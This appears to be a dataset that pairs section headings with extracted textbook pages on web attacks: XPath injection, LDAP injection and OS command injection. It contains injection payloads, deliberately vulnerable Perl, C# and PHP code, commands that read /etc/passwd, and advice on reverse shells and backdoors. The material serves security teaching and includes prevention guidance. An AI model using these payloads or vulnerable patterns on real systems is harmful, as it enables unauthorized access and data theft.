PPMM"
  },
  {
    "input": "Informed XPath Injection",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 346\n346 Chapter 9 n Attacking Data Stores\nIn this case, an attacker may be able to subvert the application’s query in an\nidentical way to a SQL injection fl aw. For example, supplying a password with\nthis value:\n‘ or ‘a’=’a\nresults in the following XPath query, which retrieves the credit card details of\nall users:\n//address[surname/text()=’Dawes’ and password/text()=’’ or ‘a’=’a’]/\nccard/text()\nNOTE\nn As with SQL injection, single quotation marks are not required when\ninjecting into a numeric value.\nn Unlike SQL queries, keywords in XPath queries are case-sensitive, as are\nthe element names in the XML document itself.\nInformed XPath Injection\nXPath injection fl aws can be exploited to retrieve arbitrary information from\nwithin the target XML document. One reliable way of doing this uses the same\ntechnique as was described for SQL injection, of causing the application to\nrespond in different ways, contingent on a condition specifi ed by the attacker.\nSubmitting the following two passwords will result in different behavior\nby the application. Results are returned in the fi rst case but not in the second:\n‘ or 1=1 and ‘a’=’a\n‘ or 1=2 and ‘a’=’a\nThis difference in behavior can be leveraged to test the truth of any specifi ed\ncondition and, therefore, extract arbitrary information one byte at a time. As\nwith SQL, the XPath language contains a substring function that can be used\nto test the value of a string one character at a time. For example, supplying this\npassword:\n‘ or //address[surname/text()=’Gates’ and substring(password/text(),1,1)=\n‘M’] and ‘a’=’a\nresults in the following XPath query, which returns results if the fi rst character\nof the Gates user’s password is M:\n//address[surname/text()=’Dawes’ and password/text()=’’ or\n//address[surname/text()=’Gates’ and substring(password/text(),1,1)= ‘M’]\nand ‘a’=’a ‘]/ccard/text()\ncc0099..iinndddd 334466 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Blind XPath Injection",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 347\nChapter 9 n Attacking Data Stores 347\nBy cycling through each character position and testing each possible value,\nan attacker can extract the full value of Gates’ password.\nTRY IT!\nhttp://mdsec.net/cclookup/14/\nBlind XPath Injection\nIn the attack just described, the injected test condition specifi ed both the absolute\npath to the extracted data (address) and the names of the targeted fi elds (surname\nand password). In fact, it is possible to mount a fully blind attack without pos-\nsessing this information. XPath queries can contain steps that are relative to the\ncurrent node within the XML document, so from the current node it is possible\nto navigate to the parent node or to a specifi c child node. Furthermore, XPath\ncontains functions to query meta-information about the document, including\nthe name of a specifi c element. Using these techniques, it is possible to extract\nthe names and values of all nodes within the document without knowing any\nprior information about its structure or contents.\nFor example, you can use the substring technique described previously to\nextract the name of the current node’s parent by supplying a series of passwords\nof this form:\n‘ or substring(name(parent::*[position()=1]),1,1)= ‘a\nThis input generates results, because the fi rst letter of the address node is a.\nMoving on to the second letter, you can confi rm that this is d by supplying the\nfollowing passwords, the last of which generates results:\n‘ or substring(name(parent::*[position()=1]),2,1)=’a\n‘ or substring(name(parent::*[position()=1]),2,1)=’b\n‘ or substring(name(parent::*[position()=1]),2,1)=’c\n‘ or substring(name(parent::*[position()=1]),2,1)=’d\nHaving established the name of the address node, you can then cycle through\neach of its child nodes, extracting all their names and values. Specifying the\nrelevant child node by index avoids the need to know the names of any nodes.\nFor example, the following query returns the value Hunter:\n//address[position()=3]/child::node()[position()=4]/text()\nAnd the following query returns the value letmein:\n//address[position()=3]/child::node()[position()=6]/text()\ncc0099..iinndddd 334477 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Finding XPath Injection Flaws",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 348\n348 Chapter 9 n Attacking Data Stores\nThis technique can be used in a completely blind attack, where no results are\nreturned within the application’s responses, by crafting an injected condition\nthat specifi es the target node by index. For example, supplying the following\npassword returns results if the fi rst character of Gates’ password is M:\n‘ or substring(//address[position()=1]/child::node()[position()=6]/\ntext(),1,1)= ‘M’ and ‘a’=’a\nBy cycling through every child node of every address node, and extracting\ntheir values one character at a time, you can extract the entire contents of the\nXML data store.\nTIP XPath contains two useful functions that can help you automate the\npreceding attack and quickly iterate through all nodes and data in the XML\ndocument:\nn count() returns the number of child nodes of a given element, which\ncan be used to determine the range of position() values to iterate\nover.\nn string-length() returns the length of a supplied string, which can be\nused to determine the range of substring() values to iterate over.\nTRY IT!\nhttp://mdsec.net/cclookup/19/\nFinding XPath Injection Flaws\nMany of the attack strings that are commonly used to probe for SQL injection\nfl aws typically result in anomalous behavior when submitted to a function that\nis vulnerable to XPath injection. For example, either of the following two strings\nusually invalidates the XPath query syntax and generates an error:\n‘\n‘--\nOne or more of the following strings typically result in some change in the\napplication’s behavior without causing an error, in the same way as they do in\nrelation to SQL injection fl aws:\n‘ or ‘a’=’a\n‘ and ‘a’=’b\nor 1=1\nand 1=2\ncc0099..iinndddd 334488 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Injecting into LDAP",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 349\nChapter 9 n Attacking Data Stores 349\nHence, in any situation where your tests for SQL injection provide tentative\nevidence for a vulnerability, but you are unable to conclusively exploit the fl aw,\nyou should investigate the possibility that you are dealing with an XPath injec-\ntion fl aw.\nHACK STEPS\n1. Try submitting the following values, and determine whether these result\nin different application behavior, without causing an error:\n‘ or count(parent::*[position()=1])=0 or ‘a’=’b\n‘ or count(parent::*[position()=1])>0 or ‘a’=’b\nIf the parameter is numeric, also try the following test strings:\n1 or count(parent::*[position()=1])=0\n1 or count(parent::*[position()=1])>0\n2. If any of the preceding strings causes differential behavior within the\napplication without causing an error, it is likely that you can extract arbi-\ntrary data by crafting test conditions to extract one byte of information at\na time. Use a series of conditions with the following form to determine\nthe name of the current node’s parent:\nsubstring(name(parent::*[position()=1]),1,1)=’a’\n3. Having extracted the name of the parent node, use a series of conditions\nwith the following form to extract all the data within the XML tree:\nsubstring(//parentnodename[position()=1]/child::node()\n[position()=1]/text(),1,1)=’a’\nPreventing XPath Injection\nIf you think it is necessary to insert user-supplied input into an XPath query,\nthis operation should only be performed on simple items of data that can be\nsubjected to strict input validation. The user input should be checked against\na white list of acceptable characters, which should ideally include only alpha-\nnumeric characters. Characters that may be used to interfere with the XPath\nquery should be blocked, including ( ) = ‘ [ ] : , * / and all whitespace.\nAny input that does not match the white list should be rejected, not sanitized.\nInjecting into LDAP\nThe Lightweight Directory Access Protocol (LDAP) is used to access directory\nservices over a network. A directory is a hierarchically organized data store that\nmay contain any kind of information but is commonly used to store personal\ndata such as names, telephone numbers, e-mail addresses, and job functions.\ncc0099..iinndddd 334499 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 350\n350 Chapter 9 n Attacking Data Stores\nCommon examples of LDAP are the Active Directory used within Windows\ndomains, and OpenLDAP, used in various situations. You are most likely to\nencounter LDAP being used in corporate intranet-based web applications, such\nas an HR application that allows users to view and modify information about\nemployees.\nEach LDAP query uses one or more search fi lters, which determine the direc-\ntory entries that are returned by the query. Search fi lters can use various logical\noperators to represent complex search conditions. The most common search\nfi lters you are likely to encounter are as follows:\nn Simple match conditions match on the value of a single attribute. For\nexample, an application function that searches for a user via his username\nmight use this fi lter:\n(username=daf)\nn Disjunctive queries specify multiple conditions, any one of which must\nbe satisfi ed by entries that are returned. For example, a search function\nthat looks up a user-supplied search term in several directory attributes\nmight use this fi lter:\n(|(cn=searchterm)(sn=searchterm)(ou=searchterm))\nn Conjunctive queries specify multiple conditions, all of which must be\nsatisfi ed by entries that are returned. For example, a login mechanism\nimplemented in LDAP might use this fi lter:\n(&(username=daf)(password=secret)\nAs with other forms of injection, if user-supplied input is inserted into an\nLDAP search fi lter without any validation, it may be possible for an attacker\nto supply crafted input that modifi es the fi lter’s structure and thereby retrieve\ndata or perform actions in an unauthorized way.\nIn general, LDAP injection vulnerabilities are not as readily exploitable as\nSQL injection fl aws, due to the following factors:\nn Where the search fi lter employs a logical operator to specify a conjunctive\nor disjunctive query, this usually appears before the point where user-\nsupplied data is inserted and therefore cannot be modifi ed. Hence, simple\nmatch conditions and conjunctive queries don’t have an equivalent to the\n“or 1=1” type of attack that arises with SQL injection.\nn In the LDAP implementations that are in common use, the directory attri-\nbutes to be returned are passed to the LDAP APIs as a separate parameter\nfrom the search fi lter and normally are hard-coded within the application.\ncc0099..iinndddd 335500 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Exploiting LDAP Injection",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 351\nChapter 9 n Attacking Data Stores 351\nHence, it usually is not possible to manipulate user-supplied input to\nretrieve different attributes than the query was intended to retrieve.\nn Applications rarely return informative error messages, so vulnerabilities\ngenerally need to be exploited “blind.”\nExploiting LDAP Injection\nDespite the limitations just described, in many real-world situations it is possible\nto exploit LDAP injection vulnerabilities to retrieve unauthorized data from the\napplication or to perform unauthorized actions. The details of how this is done typi-\ncally are highly dependent on the construction of the search fi lter, the entry point\nfor user input, and the implementation details of the back-end LDAP service itself.\nDisjunctive Queries\nConsider an application that lets users list employees within a specifi ed depart-\nment of the business. The search results are restricted to the geographic locations\nthat the user is authorized to view. For example, if a user is authorized to view\nthe London and Reading locations, and he searches for the “sales” department,\nthe application performs the following disjunctive query:\n(|(department=London sales)(department=Reading sales))\nHere, the application constructs a disjunctive query and prepends different\nexpressions before the user-supplied input to enforce the required access control.\nIn this situation, an attacker can subvert the query to return details of all\nemployees in all locations by submitting the following search term:\n)(department=*\nThe * character is a wildcard in LDAP; it matches any item. When this input\nis embedded into the LDAP search fi lter, the following query is performed:\n(|(department=London )(department=*)(department=Reading )(department=*))\nSince this is a disjunctive query and contains the wildcard term (depart-\nment=*), it matches on all directory entries. It returns the details of all employees\nfrom all locations, thereby subverting the application’s access control.\nTRY IT!\nhttp://mdsec.net/employees/31/\nhttp://mdsec.net/employees/49/\ncc0099..iinndddd 335511 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 352\n352 Chapter 9 n Attacking Data Stores\nConjunctive Queries\nConsider a similar application function that allows users to search for employ-\nees by name, again within the geographic region they are authorized to view.\nIf a user is authorized to search within the London location, and he searches\nfor the name daf, the following query is performed:\n(&(givenName=daf)(department=London*))\nHere, the user’s input is inserted into a conjunctive query, the second part of\nwhich enforces the required access control by matching items in only one of\nthe London departments.\nIn this situation, two different attacks might succeed, depending on the\ndetails of the back-end LDAP service. Some LDAP implementations, including\nOpenLDAP, allow multiple search fi lters to be batched, and these are applied\ndisjunctively. (In other words, directory entries are returned that match any of\nthe batched fi lters.) For example, an attacker could supply the following input:\n*))(&(givenName=daf\nWhen this input is embedded into the original search fi lter, it becomes:\n(&(givenName=*))(&(givenName=daf)(department=London*))\nThis now contains two search fi lters, the fi rst of which contains a single\nwildcard match condition. The details of all employees are returned from all\nlocations, thereby subverting the application’s access control.\nTRY IT!\nhttp://mdsec.net/employees/42/\nNOTE This technique of injecting a second search fi lter is also effective\nagainst simple match conditions that do not employ any logical operator, pro-\nvided that the back-end implementation accepts multiple search fi lters.\nThe second type of attack against conjunctive queries exploits how many LDAP\nimplementations handle NULL bytes. Because these implementations typically are\nwritten in native code, a NULL byte within a search fi lter effectively terminates the\nstring, and any characters coming after the NULL are ignored. Although LDAP\ndoes not itself support comments (in the way that the -- sequence can be used\nin SQL), this handling of NULL bytes can effectively be exploited to “comment\nout” the remainder of the query.\ncc0099..iinndddd 335522 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Finding LDAP Injection Flaws",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 353\nChapter 9 n Attacking Data Stores 353\nIn the preceding example, the attacker can supply the following input:\n*))%00\nThe %00 sequence is decoded by the application server into a literal NULL byte,\nso when the input is embedded into the search fi lter, it becomes:\n(&(givenName=*))[NULL])(department=London*))\nBecause this fi lter is truncated at the NULL byte, as far as LDAP is concerned it\ncontains only a single wildcard condition, so the details of all employees from\ndepartments outside the London area are also returned.\nTRY IT!\nhttp://mdsec.net/employees/13/\nhttp://mdsec.net/employees/42/\nFinding LDAP Injection Flaws\nSupplying invalid input to an LDAP operation typically does not result in an\ninformative error message. In general, the evidence available to you in diagnosing\nvulnerability includes the results returned by a search function and the occur-\nrence of an error such as an HTTP 500 status code. Nevertheless, you can use the\nfollowing steps to identify an LDAP injection fl aw with a degree of reliability.\nHACK STEPS\n1. Try entering just the * character as a search term. This character functions\nas a wildcard in LDAP, but not in SQL. If a large number of results are\nreturned, this is a good indicator that you are dealing with an LDAP query.\n2. Try entering a number of closing brackets:\n))))))))))\nThis input closes any brackets enclosing your input, as well as those\nthat encapsulate the main search filter itself. This results in unmatched\nclosing brackets, thus invalidating the query syntax. If an error results, the\napplication may be vulnerable to LDAP injection. (Note that this input may\nalso break many other kinds of application logic, so this provides a strong\nindicator only if you are already confident that you are dealing with an\nLDAP query.)\nContinued\ncc0099..iinndddd 335533 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c09.indd V3 - 07/28/2011 Page 354\n354 Chapter 9 n Attacking Data Stores\nHACK STEPS (CONTINUED)\n3. Try entering various expressions designed to interfere with different\ntypes of queries, and see if these allow you to influence the results being\nreturned. The cn attribute is supported by all LDAP implementations and\nis useful to use if you do not know any details about the directory you are\nquerying. For example:\n)(cn=*\n*))(|(cn=*\n*))%00\nPreventing LDAP Injection\nIf it is necessary to insert user-supplied input into an LDAP query, this opera-\ntion should be performed only on simple items of data that can be subjected to\nstrict input validation. The user input should be checked against a white list of\nacceptable characters, which should ideally include only alphanumeric char-\nacters. Characters that may be used to interfere with the LDAP query should\nbe blocked, including ( ) ; , * | & = and the null byte. Any input that does\nnot match the white list should be rejected, not sanitized.\nSummary\nWe have examined a range of vulnerabilities that allow you to inject into web\napplication data stores. These vulnerabilities may allow you to read or modify\nsensitive application data, perform other unauthorized actions, or subvert appli-\ncation logic to achieve an objective.\nAs serious as these attacks are, they are only part of a wider range of attacks\nthat involve injecting into interpreted contexts. Other attacks in this category\nmay allow you to execute commands on the server’s operating system, retrieve\narbitrary fi les, and interfere with other back-end components. The next chapter\nexamines these attacks and others. It looks at how vulnerabilities within a web\napplication can lead to compromise of key parts of the wider infrastructure that\nsupports the application.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. You are trying to exploit a SQL injection fl aw by performing a UNION attack\nto retrieve data. You do not know how many columns the original query\nreturns. How can you fi nd this out?\ncc0099..iinndddd 335544 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 355\nChapter 9 n Attacking Data Stores 355\n2. You have located a SQL injection vulnerability in a string parameter. You\nbelieve the database is either MS-SQL or Oracle, but you can’t retrieve\nany data or an error message to confi rm which database is running. How\ncan you fi nd this out?\n3. You have submitted a single quotation mark at numerous locations through-\nout the application. From the resulting error messages you have diagnosed\nseveral potential SQL injection fl aws. Which one of the following would\nbe the safest location to test whether more crafted input has an effect on\nthe application’s processing?\n(a) Registering a new user\n(b) Updating your personal details\n(c) Unsubscribing from the service\n4. You have found a SQL injection vulnerability in a login function, and\nyou try to use the input ‘ or 1=1-- to bypass the login. Your attack fails,\nand the resulting error message indicates that the -- characters are being\nstripped by the application’s input fi lters. How could you circumvent this\nproblem?\n5. You have found a SQL injection vulnerability but have been unable to\ncarry out any useful attacks, because the application rejects any input\ncontaining whitespace. How can you work around this restriction?\n6. The application is doubling up all single quotation marks within user\ninput before these are incorporated into SQL queries. You have found a\nSQL injection vulnerability in a numeric fi eld, but you need to use a string\nvalue in one of your attack payloads. How can you place a string in your\nquery without using any quotation marks?\n7. In some rare situations, applications construct dynamic SQL queries from\nuser-supplied input in a way that cannot be made safe using parameter-\nized queries. When does this occur?\n8. You have escalated privileges within an application such that you now\nhave full administrative access. You discover a SQL injection vulnerability\nwithin a user administration function. How can you leverage this vulner-\nability to further advance your attack?\n9. You are attacking an application that holds no sensitive data and contains\nno authentication or access control mechanisms. In this situation, how\nshould you rank the signifi cance of the following vulnerabilities?\n(a) SQL injection\n(b) XPath injection\n(c) OS command injection\ncc0099..iinndddd 335555 88//1199//22001111 1122::0099::3344 PPMM\nStuttard c09.indd V3 - 07/28/2011 Page 356\n356 Chapter 9 n Attacking Data Stores\n10. You are probing an application function that enables you to search person-\nnel details. You suspect that the function is accessing either a database or\nan Active Directory back end. How could you try to determine which of\nthese is the case?\ncc0099..iinndddd 335566 88//1199//22001111 1122::0099::3344 PPMM"
  },
  {
    "input": "Chapter 10 Attacking Back-End Components",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 357\nCHAPTER\n10\nAttacking Back-End\nComponents\nWeb applications are increasingly complex offerings. They frequently function\nas the Internet-facing interface to a variety of business-critical resources on the\nback end, including networked resources such as web services, back-end web\nservers, mail servers, and local resources such as fi lesystems and interfaces to the\noperating system. Frequently, the application server also acts as a discretionary\naccess control layer for these back-end components. Any successful attack that\ncould perform arbitrary interaction with a back-end component could potentially\nviolate the entire access control model applied by the web application, allowing\nunauthorized access to sensitive data and functionality.\nWhen data is passed from one component to another, it is interpreted by\ndifferent sets of APIs and interfaces. Data that is considered “safe” by the core\napplication may be extremely unsafe within the onward component, which\nmay support different encodings, escape characters, fi eld delimiters, or string\nterminators. Additionally, the onward component may possess considerably\nmore functionality than what the application normally invokes. An attacker\nexploiting an injection vulnerability can often go beyond merely breaking the\napplication’s access control. She can exploit the additional functionality sup-\nported by the back-end component to compromise key parts of the organiza-\ntion’s infrastructure.\n357\ncc1100..iinndddd 335577 88//1199//22001111 1122::1100::4455 PPMM"
  },
  {
    "input": "Example 1: Injecting Via Perl",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 358\n358 Chapter 10 n Attacking Back-End Components\nInjecting OS Commands\nMost web server platforms have evolved to the point where built-in APIs exist\nto perform practically any required interaction with the server’s operating\nsystem. Properly used, these APIs can enable developers to access the fi lesys-\ntem, interface with other processes, and carry out network communications in\na safe manner. Nevertheless, there are many situations in which developers\nelect to use the more heavyweight technique of issuing operating system com-\nmands directly to the server. This option can be attractive because of its power\nand simplicity and often provides an immediate and functional solution to\na particular problem. However, if the application passes user-supplied input\nto operating system commands, it may be vulnerable to command injection,\nenabling an attacker to submit crafted input that modifi es the commands that\nthe developers intended to perform.\nThe functions commonly used to issue operating system commands, such\nas exec in PHP and wscript.shell in ASP, do not impose any restrictions on\nthe scope of commands that may be performed. Even if a developer intends\nto use an API to perform a relatively benign task such as listing a directory’s\ncontents, an attacker may be able to subvert it to write arbitrary fi les or launch\nother programs. Any injected commands usually run in the security context\nof the web server process, which often is suffi ciently powerful for an attacker\nto compromise the entire server.\nCommand injection fl aws of this kind have arisen in numerous off-the-shelf\nand custom-built web applications. They have been particularly prevalent within\napplications that provide an administrative interface to an enterprise server or\nto devices such as fi rewalls, printers, and routers. These applications often have\nparticular requirements for operating system interaction that lead developers\nto use direct commands that incorporate user-supplied data.\nExample 1: Injecting Via Perl\nConsider the following Perl CGI code, which is part of a web application for\nserver administration. This function allows administrators to specify a direc-\ntory on the server and view a summary of its disk usage:\n#!/usr/bin/perl\nuse strict;\nuse CGI qw(:standard escapeHTML);\nprint header, start_html(“”);\nprint “<pre>”;\nmy $command = “du -h --exclude php* /var/www/html”;\n$command= $command.param(“dir”);\n$command=`$command`;\ncc1100..iinndddd 335588 88//1199//22001111 1122::1100::4455 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 359\nChapter 10 n Attacking Back-End Components 359\nprint “$command\\n”;\nprint end_html;\nWhen used as intended, this script simply appends the value of the user-\nsupplied dir parameter to the end of a preset command, executes the command,\nand displays the results, as shown in Figure 10-1.\nFigure 10-1: A simple application function for listing a directory’s contents\nThis functionality can be exploited in various ways by supplying crafted input\ncontaining shell metacharacters. These characters have a special meaning to\nthe interpreter that processes the command and can be used to interfere with\nthe command that the developer intended to execute. For example, the pipe\ncharacter (|) is used to redirect the output from one process into the input of\nanother, enabling multiple commands to be chained together. An attacker can\nleverage this behavior to inject a second command and retrieve its output, as\nshown in Figure 10-2.\nHere, the output from the original du command has been redirected as the\ninput to the command cat/etc/passwd. This command simply ignores the\ninput and performs its sole task of outputting the contents of the passwd fi le.\nAn attack as simple as this may appear improbable; however, exactly this type\nof command injection has been found in numerous commercial products. For\nexample, HP OpenView was found to be vulnerable to a command injection\nfl aw within the following URL:\nhttps://target:3443/OvCgi/connectedNodes.ovpl?node=a| [your command] |\ncc1100..iinndddd 335599 88//1199//22001111 1122::1100::4455 PPMM"
  },
  {
    "input": "Example 2: Injecting Via ASP",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 360\n360 Chapter 10 n Attacking Back-End Components\nFigure 10-2: A successful command injection attack\nExample 2: Injecting Via ASP\nConsider the following C# code, which is part of a web application for admin-\nistering a web server. The function allows administrators to view the contents\nof a requested directory:\nstring dirName = “C:\\\\filestore\\\\” + Directory.Text;\nProcessStartInfo psInfo = new ProcessStartInfo(“cmd”, “/c dir “ +\ndirName);\n...\nProcess proc = Process.Start(psInfo);\nWhen used as intended, this script inserts the value of the user-supplied\nDirectory parameter into a preset command, executes the command, and\ndisplays the results, as shown in Figure 10-3.\nAs with the vulnerable Perl script, an attacker can use shell metacharacters to\ninterfere with the preset command intended by the developer and inject his own\ncommand. The ampersand character (&) is used to batch multiple commands.\nSupplying a fi lename containing the ampersand character and a second com-\nmand causes this command to be executed and its results displayed, as shown\nin Figure 10-4.\ncc1100..iinndddd 336600 88//1199//22001111 1122::1100::4466 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 361\nChapter 10 n Attacking Back-End Components 361\nFigure 10-3: A function to list the contents of a directory\nFigure 10-4: A successful command injection attack\ncc1100..iinndddd 336611 88//1199//22001111 1122::1100::4466 PPMM"
  },
  {
    "input": "Injecting Through Dynamic Execution",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 362\n362 Chapter 10 n Attacking Back-End Components\nTRY IT!\nhttp://mdsec.net/admin/5/\nhttp://mdsec.net/admin/9/\nhttp://mdsec.net/admin/14/\nInjecting Through Dynamic Execution\nMany web scripting languages support the dynamic execution of code that is\ngenerated at runtime. This feature enables developers to create applications that\ndynamically modify their own code in response to various data and conditions.\nIf user input is incorporated into code that is dynamically executed, an attacker\nmay be able to supply crafted input that breaks out of the intended data context\nand specifi es commands that are executed on the server in the same way as if\nthey had been written by the original developer. The fi rst target of an attacker\nat this point typically is to inject an API that runs OS commands.\nThe PHP function eval is used to dynamically execute code that is passed to\nthe function at runtime. Consider a search function that enables users to create\nstored searches that are then dynamically generated as links within their user\ninterface. When users access the search function, they use a URL like the following:\n/search.php?storedsearch=\\$mysearch%3dwahh\nThe server-side application implements this functionality by dynamically\ngenerating variables containing the name/value pairs specifi ed in the stored-\nsearch parameter, in this case creating a mysearch variable with the value wahh:\n$storedsearch = $_GET[‘storedsearch’];\neval(“$storedsearch;”);\nIn this situation, you can submit crafted input that is dynamically executed\nby the eval function, resulting in injection of arbitrary PHP commands into\nthe server-side application. The semicolon character can be used to batch com-\nmands in a single parameter. For example, to retrieve the contents of the fi le\n/etc/password, you could use either the file_get_contents or system command:\n/search.php?storedsearch=\\$mysearch%3dwahh;%20echo%20file_get\n_contents(‘/etc/passwd’)\n/search.php?storedsearch=\\$mysearch%3dwahh;%20system(‘cat%20/etc/\npasswd’)\nNOTE The Perl language also contains an eval function that can be\nexploited in the same way. Note that the semicolon character may need to\nbe URL-encoded (as %3b) because some CGI script parsers interpret this as a\nparameter delimiter. In classic ASP, Execute() performs a similar role.\ncc1100..iinndddd 336622 88//1199//22001111 1122::1100::4466 PPMM"
  },
  {
    "input": "Finding OS Command Injection Flaws",
    "output": "Stuttard c10.indd V2 - 07/05/2011 Page 363\nChapter 10 n Attacking Back-End Components 363\nFinding OS Command Injection Flaws\nIn your application mapping exercises (see Chapter 4), you should have identi-\nfi ed any instances where the web application appears to be interacting with\nthe underlying operating system by calling external processes or accessing the\nfi lesystem. You should probe all these functions, looking for command injection\nfl aws. In fact, however, the application may issue operating system commands\ncontaining absolutely any item of user-supplied data, including every URL and\nbody parameter and every cookie. To perform a thorough test of the application,\nyou therefore need to target all these items within every application function.\nDifferent command interpreters handle shell metacharacters in different ways.\nIn principle, any type of application development platform or web server may\ncall out to any kind of shell interpreter, running either on its own operating sys-\ntem or that of any other host. Therefore, you should not make any assumptions\nabout the application’s handling of metacharacters based on any knowledge of\nthe web server’s operating system.\nTwo broad types of metacharacters may be used to inject a separate command\ninto an existing preset command:\nn The characters ;|& and newline may be used to batch multiple commands,\none after the other. In some cases, these characters may be doubled with\ndifferent effects. For example, in the Windows command interpreter,\nusing&& causes the second command to run only if the fi rst is successful.\nUsing || causes the second command to always run, regardless of the\nsuccess of the fi rst.\nn The backtick character (`) can be used to encapsulate a separate command\nwithin a data item being processed by the original command. Placing an\ninjected command within backticks causes the shell interpreter to execute\nthe command and replace the encapsulated text with the results of this\ncommand before continuing to execute the resulting command string.\nIn the previous examples, it was straightforward to verify that command injec-\ntion was possible and to retrieve the results of the injected command, because\nthose results were returned immediately within the application’s response.\nIn many cases, however, this may not be possible. You may be injecting into a\ncommand that returns no results and which does not affect the application’s\nsubsequent processing in any identifi able way. Or the method you have used\nto inject your chosen command may be such that its results are lost as multiple\ncommands are batched together.\nIn general, the most reliable way to detect whether command injection is\npossible is to use time-delay inference in a similar way as was described for\nexploiting blind SQL injection. If a potential vulnerability appears to exist, you\ncan then use other methods to confi rm this and to retrieve the results of your\ninjected commands.\ncc1100..iinndddd 336633 88//1199//22001111 1122::1100::4466 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 364\n364 Chapter 10 n Attacking Back-End Components\nHACK STEPS\n1. You can normally use the ping command as a means of triggering a time\ndelay by causing the server to ping its loopback interface for a specific\nperiod. There are minor differences between how Windows and UNIX-\nbased platforms handle command separators and the ping command.\nHowever, the following all-purpose test string should induce a 30-second\ntime delay on either platform if no filtering is in place:\n|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &\nTo maximize your chances of detecting a command injection flaw if the\napplication is filtering certain command separators, you should also sub-\nmit each of the following test strings to each targeted parameter in turn\nand monitor the time taken for the application to respond:\n| ping –i 30 127.0.0.1 |\n| ping –n 30 127.0.0.1 |\n& ping –i 30 127.0.0.1 &\n& ping –n 30 127.0.0.1 &\n; ping 127.0.0.1 ;\n%0a ping –i 30 127.0.0.1 %0a\n` ping 127.0.0.1 `\n2. If a time delay occurs, the application may be vulnerable to command\ninjection. Repeat the test case several times to confirm that the delay was\nnot the result of network latency or other anomalies. You can try changing\nthe value of the -n or -i parameters and confirming that the delay expe-\nrienced varies systematically with the value supplied.\n3. Using whichever of the injection strings was found to be successful, try\ninjecting a more interesting command (such as ls or dir). Determine\nwhether you can retrieve the results of the command to your browser.\n4. If you are unable to retrieve results directly, you have other options:\nn You can attempt to open an out-of-band channel back to your computer.\nTry using TFTP to copy tools up to the server, using telnet or netcat to\ncreate a reverse shell back to your computer, and using the mail com-\nmand to send command output via SMTP.\nn You can redirect the results of your commands to a fi le within the web\nroot, which you can then retrieve directly using your browser. For example:\ndir > c:\\inetpub\\wwwroot\\foo.txt\n5. When you have found a means of injecting commands and retrieving the\nresults, you should determine your privilege level (by using whoami or\nsomething similar, or attempting to write a harmless file to a protected\ndirectory). You may then seek to escalate privileges, gain backdoor access\nto sensitive application data, or attack other hosts reachable from the\ncompromised server.\ncc1100..iinndddd 336644 88//1199//22001111 1122::1100::4466 PPMM\nStuttard c10.indd V2 - 07/05/2011 Page 365\nChapter 10 n Attacking Back-End Components 365\nIn some cases, it may not be possible to inject an entirely separate com-\nmand due to fi ltering of required characters or the behavior of the command\nAPI being used by the application. Nevertheless, it may still be possible to\ninterfere with the behavior of the command being performed to achieve\nsome desired result.\nIn one instance seen by the authors, the application passed user input\nto the operating system command nslookup to fi nd the IP address of a\ndomain name supplied by the user. The metacharacters needed to inject new\ncommands were being blocked, but the < and > characters used to redirect\nthe command’s input and output were allowed. The nslookup command\nusually outputs the IP address for a domain name, which did not seem to\nprovide an effective attack vector. However, if an invalid domain name is\nsupplied, the command outputs an error message that includes the domain\nname that was looked up. This behavior proved suffi cient to deliver a\nserious attack:\nn Submit a fragment of server-executable script code as the domain name\nto be resolved. The script can be encapsulated in quotes to ensure that\nthe command interpreter treats it as a single token.\nn Use the > character to redirect the command’s output to a fi le in an execut-\nable folder within the web root. The command executed by the operating\nsystem is as follows:\nnslookup “[script code]” > [/path/to/executable_file]\nn When the command is run, the following output is redirected to the execut-\nable fi le:\n** server can’t find [script code]: NXDOMAIN\nn This fi le can then be invoked using a browser, and the injected script\ncode is executed on the server. Because most scripting languages allow\npages to contain a mix of client-side content and server-side markup,\nthe parts of the error message that the attacker does not control are\njust treated as plain text, and the markup within the injected script is\nexecuted. The attack therefore succeeds in leveraging a restricted com-\nmand injection condition to introduce an unrestricted backdoor into the\napplication server.\nTRY IT!\nhttp://mdsec.net/admin/18/\ncc1100..iinndddd 336655 88//1199//22001111 1122::1100::4477 PPMM"
  },
  {
    "input": "Finding Dynamic Execution Vulnerabilities",
